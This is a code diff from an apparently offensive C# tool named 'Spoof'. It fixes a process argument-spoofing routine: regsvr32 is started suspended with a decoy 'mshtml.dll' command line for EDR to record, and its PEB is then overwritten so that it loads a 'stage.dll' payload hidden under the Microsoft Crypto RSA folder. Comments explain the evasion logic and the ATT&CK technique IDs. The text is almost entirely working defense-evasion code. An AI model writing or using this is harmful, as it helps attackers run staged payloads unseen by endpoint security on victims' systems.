@@ -111,14 +111,19 @@ public static class Spoof
 
     public static void Go()
     {
-        // realCmd    -> what regsvr32 actually processes (passed to CreateProcessW)
-        // spoofedCmd -> what EDR sees in Win32_Process.CommandLine (PEB-overwritten)
-        // spoofedCmd is shorter than realCmd; the PEB's CommandLine.Buffer is
-        // allocated to fit realCmd, we write spoofedCmd bytes (no overflow),
-        // and set Length = spoofedCmd byte count so EDR sees only the decoy.
-        // Decoy is regsvr32 + a real signed System32 DLL (mshtml.dll) — the
-        // canonical T1218.010 decoy that EDR is tuned to expect.
-        string spoofedCmd = "regsvr32.exe /s \"C:\\Windows\\System32\\mshtml.dll\"";
+        // PEB arg-spoof technique (T1055.012):
+        //   spoofedCmd -> passed to CreateProcessW. EDR reads the PEB at process
+        //                 creation (kernel-side), so EDR sees spoofedCmd.
+        //   realCmd    -> written to PEB.Buffer while the process is suspended.
+        //                 The process reads the PEB at startup, so the process
+        //                 sees realCmd. EDR's earlier read is not refreshed.
+        // PEB.Buffer is allocated to fit spoofedCmd's byte length, so spoofedCmd
+        // MUST be at least as long as realCmd (in chars) to avoid heap overflow.
+        // Pad spoofedCmd with trailing whitespace (outside the quoted DLL path)
+        // to match realCmd's length; the trailing chars are ignored by regsvr32's
+        // argv parser and are cosmetic noise in the EDR-visible cmdline.
+        // Decoy DLL is mshtml.dll (canonical T1218.010 decoy).
+        string spoofedCmd = "regsvr32.exe /s \"C:\\Windows\\System32\\mshtml.dll\"                        ";
         string realCmd    = "regsvr32.exe /s \"C:\\ProgramData\\Microsoft\\Crypto\\RSA\\S-1-5-18\\stage.dll\"";
 
         STARTUPINFO si = new STARTUPINFO();
@@ -127,7 +132,7 @@ public static class Spoof
         PROCESS_INFORMATION pi;
 
         Log("[*] Creating suspended regsvr32.exe...");
-        if (!CreateProcessW(null, realCmd, IntPtr.Zero, IntPtr.Zero, false,
+        if (!CreateProcessW(null, spoofedCmd, IntPtr.Zero, IntPtr.Zero, false,
             CREATE_SUSPENDED, IntPtr.Zero, null, ref si, out pi))
         {
             int err = Marshal.GetLastWin32Error();
@@ -177,7 +182,7 @@ public static class Spoof
         }
         Log("[+] Command line pointer read");
 
-        byte[] newCmdBytes = Encoding.Unicode.GetBytes(spoofedCmd);
+        byte[] newCmdBytes = Encoding.Unicode.GetBytes(realCmd);
         IntPtr bufferPtr = Marshal.ReadIntPtr(cmdBuffer, 8);
 
         int written;
@@ -189,7 +194,7 @@ public static class Spoof
             CloseHandle(pi.hThread);
             return;
         }
-        Log("[+] Command line overwritten: mshtml.dll");
+        Log("[+] Command line overwritten: stage.dll");
 
         byte[] lengthBytes = BitConverter.GetBytes(newCmdBytes.Length);
         byte[] maxLengthBytes = BitConverter.GetBytes(newCmdBytes.Length);
